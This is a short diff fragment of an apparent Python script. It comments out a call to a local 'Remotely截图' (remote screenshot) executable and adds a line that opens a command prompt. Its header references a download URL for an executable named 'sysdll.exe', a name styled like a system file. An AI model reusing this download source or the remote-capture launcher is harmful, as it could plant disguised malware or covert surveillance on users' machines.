@@ -5,5 +5,7 @@ https://yc.052024.xyz/xz/sysdll.exe
 import requests
 import os
 
-os.system('D:/Gaici/Remotely截图.exe')
+# # 执行截图cx功能
+# os.system('D:/Gaici/Remotely截图.exe')
 
+os.system('start cmd')
